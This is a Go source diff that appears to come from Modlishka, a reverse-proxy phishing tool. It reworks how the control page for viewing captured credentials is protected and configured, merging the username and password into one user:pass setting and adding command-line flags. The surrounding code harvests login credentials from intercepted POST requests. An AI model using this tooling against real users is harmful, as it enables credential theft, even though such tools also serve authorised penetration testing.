@@ -39,8 +39,7 @@ type ExtendedControlConfiguration struct {
 	*config.Options
 	CredParams *string `json:"CredParams"`
 	ControlURL *string `json:"ControlURL"`
-	ControlUser *string `json:"controlUser"`
-	ControlPass *string `json:"controlPass"`
+	ControlCreds *string `json:"ControlCreds"`
 }
 
 type ControlConfig struct {
@@ -265,6 +264,8 @@ type CookieJar struct {
 }
 
 var credentialParameters = flag.String("credParams", "", "Credential regexp with matching groups. e.g. : baase64(username_regex),baase64(password_regex)")
+var controlURL = flag.String("controlURL", "SayHello2Modlishka", "URL to view captured credentials and settings.  Defaults to SayHello2Modlishka")
+var controlCredentials = flag.String("controlCreds", "", "Username and password to protect the credentials page.  user:pass format")
 
 var CConfig ControlConfig
 
@@ -851,7 +852,10 @@ func init() {
 
 		CConfig.active = false
 
+		// Regexes to grab username and passwords sent in POST
 		var creds []string
+		// Credentials to log into the control page
+		var controlCreds []string
 
 		var jsonConfig ExtendedControlConfiguration
 
@@ -878,16 +882,21 @@ func init() {
 
 		if jsonConfig.ControlURL != nil {
 			CConfig.url = *jsonConfig.ControlURL
-		} else {
-			CConfig.url = "SayHello2Modlishka"
+		} else if *controlURL != "" {
+			CConfig.url = *controlURL
 		}
 
-		if jsonConfig.ControlUser != nil || jsonConfig.ControlPass != nil {
-			if jsonConfig.ControlUser == nil || jsonConfig.ControlPass == nil {
-				log.Fatalf("controlUser and controlPass must both have values")
-			}
-			CConfig.controlUser = *jsonConfig.ControlUser
-			CConfig.controlPass = *jsonConfig.ControlPass
+		if jsonConfig.ControlCreds != nil {
+			controlCreds = strings.Split(*jsonConfig.ControlCreds, ":")
+		} else if *controlCredentials != "" {
+			controlCreds = strings.Split(*controlCredentials, ":")
+		}
+
+		if len(controlCreds) == 2 {
+			CConfig.controlUser = controlCreds[0]
+			CConfig.controlPass = controlCreds[1]
+		} else if len(controlCreds) == 1 || len(controlCreds) > 2 {
+			log.Fatalf("Control credentials must be provided in user:pass format")
 		}
 
 		if jsonConfig.CredParams != nil {
